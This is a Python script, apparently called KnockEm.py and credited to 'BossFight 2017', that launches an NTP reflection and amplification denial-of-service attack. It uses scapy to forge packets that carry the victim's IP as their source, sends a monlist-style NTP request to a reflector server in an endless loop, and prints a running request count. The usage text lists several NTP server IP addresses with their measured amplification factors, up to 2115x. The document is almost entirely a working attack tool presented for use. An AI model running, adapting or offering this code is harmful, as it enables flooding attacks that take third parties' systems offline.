print("""
 /$$   /$$                               /$$             /$$$$$$$$              
| $$  /$$/                              | $$            | $$_____/              
| $$ /$$/  /$$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$      | $$       /$$$$$$/$$$$ 
| $$$$$/  | $$__  $$ /$$__  $$ /$$_____/| $$  /$$/      | $$$$$   | $$_  $$_  $$
| $$  $$  | $$  \ $$| $$  \ $$| $$      | $$$$$$/       | $$__/   | $$ \ $$ \ $$
| $$\  $$ | $$  | $$| $$  | $$| $$      | $$_  $$       | $$      | $$ | $$ | $$
| $$ \  $$| $$  | $$|  $$$$$$/|  $$$$$$$| $$ \  $$      | $$$$$$$$| $$ | $$ | $$
|__/  \__/|__/  |__/ \______/  \_______/|__/  \__/      |________/|__/ |__/ |__/
________________________________________________________________________________

    #################### Predator or pray, predator or pray
    # BossFight 2017   # Nock em out
    # Sweden           # Nock em out
    #################### Predator or pray, predator or pray
    
    
    Music: https://www.youtube.com/watch?v=F0PUVKfxkTM""")
from threading import Thread
from scapy.all import *
import sys 
import os
test232 = 0
try:
	target = str(sys.argv[1])
	ntpserver = str(sys.argv[2])
except Exception:
	print("""
Usage:
python3 KnockEm.py ip/website sourceip
Ex:
python3 KnockEm.py 1.1.1.1 29.203.21.94
Notes:
Protocol|  IP  Address  |     Amplification     |     Domain    
---------------------------------------------------------------------------
  ntp   |  80.13.78.60  |     0x (8B -> 0B)     |N/A
  ntp   | 83.143.86.202 |     1x (8B -> 8B)     |N/A
  ntp   | 119.55.252.67 |   25x (8B -> 200B)    |N/A
  ntp   | 170.56.58.53  |     1x (8B -> 8B)     |N/A
  ntp   |190.180.162.136| 2115x (8B -> 16920B)  |N/A
  ntp   | 202.38.109.3  |     1x (8B -> 8B)     |N/A
""")
	exit()
data = "\x17\x00\x03\x2a" + "\x00" * 4
packet = IP(dst=ntpserver,src=target)/UDP(sport=80,dport=80)/Raw(load=data) 
while True:
	send(packet, verbose=0)
	test232 = test232 + 1
	os.system("clear")
	print("""
Requests sent:
| """ + str(test232)  + """ |
Method:
| NTP |
IP:
| """ + target + """ |""")
	